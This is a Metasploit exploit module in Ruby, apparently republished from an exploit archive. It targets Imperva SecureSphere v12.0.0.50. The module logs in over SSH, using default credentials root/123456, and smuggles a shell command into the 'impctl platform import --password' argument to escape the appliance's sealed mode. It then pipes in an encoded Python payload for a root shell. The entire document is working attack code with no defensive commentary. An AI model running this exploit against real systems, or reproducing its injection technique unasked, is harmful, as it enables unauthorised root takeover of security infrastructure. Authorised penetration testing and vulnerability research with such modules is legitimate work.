# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::SSH
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "SecureSphere v12.0.0.50 - SealMode Shell Escape (root)",
      &#039;Description&#039;    => %q{
            This module exploits a vulnerability in SecureSphere cli to escape 
            the sealed-mode of Imperva and execute code as the root user. This 
            module requires credentials of a user to login to the SSH or can be 
            exploited by a less privileged user.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;0x09AL&#039;, # Vulnerability Discovery and Metasploit Module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;,   &#039;N/A&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
        },
      &#039;Platform&#039;       => [&#039;python&#039;],
      &#039;Arch&#039;           => ARCH_PYTHON,
      &#039;Targets&#039;        => [ [&#039;Automatic&#039;, {}] ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "01/08/2018",
      &#039;DefaultTarget&#039;  => 0
    ))
 
    register_options(
      [
        Opt::RHOST(),
        Opt::RPORT(22),
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;The username for authentication&#039;, &#039;root&#039; ]),
        OptString.new(&#039;Password&#039;, [ true, &#039;The password for authentication&#039;, &#039;123456&#039; ]),
      ]
    )
 
    register_advanced_options(
      [
        OptBool.new(&#039;SSH_DEBUG&#039;, [ false, &#039;Enable SSH debugging output (Extreme verbosity!)&#039;, false]),
        OptInt.new(&#039;SSH_TIMEOUT&#039;, [ false, &#039;Specify the maximum time to negotiate a SSH session&#039;, 30])
      ]
    )
  end
 
  def rhost
    datastore[&#039;RHOST&#039;]
  end
 
  def rport
    datastore[&#039;RPORT&#039;]
  end
 
  def username
    datastore[&#039;USERNAME&#039;]
  end
 
  def password
    datastore[&#039;PASSWORD&#039;]
  end
 
 
  def exploit
    factory = ssh_socket_factory
    ssh_options = {
      :auth_methods => [&#039;password&#039;, &#039;keyboard-interactive&#039;],
      :port         => rport,
      :use_agent => false,
      :config => false,
      :password => password,
      :proxy => factory,
      :non_interactive => true
    }
 
    ssh_options.merge!(:verbose => :debug) if datastore[&#039;SSH_DEBUG&#039;]
 
    print_status("#{rhost}:#{rport} - Attempting to login...")
 
    begin
      ssh = nil
      ::Timeout.timeout(datastore[&#039;SSH_TIMEOUT&#039;]) do
        ssh = Net::SSH.start(rhost, username, ssh_options)
      end
    rescue Rex::ConnectionError
      return
    rescue Net::SSH::Disconnect, ::EOFError
      print_error "#{rhost}:#{rport} SSH - Disconnected during negotiation"
      return
    rescue ::Timeout::Error
      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
      return
    rescue Net::SSH::AuthenticationFailed
      print_error "#{rhost}:#{rport} SSH - Failed authentication due wrong credentials."
    rescue Net::SSH::Exception => e
      print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
      return
    end
 
    if ssh
      print_good("SSH connection established successfully.")
      ssh.open_channel do |channel|
        channel.exec "impctl platform import --password \" & uname -a & sh\"" do |ch, success|
            if success
                channel.on_data do |ch, data|
                    if data.inspect.match(/Linux/)
                        print_good "Host is vulnerable"
                        channel.send_data "python -c \"#{payload.encoded}\"\n"
                        channel.close
                    else
                        print_bad "Host is not vulnerable"
                        channel.close
                    end
                 
                end
            end
       
     end
    end
 
      begin
        ssh.loop unless session_created?
      rescue Errno::EBADF => e
        elog(e.message)
      end
    end
  end
end

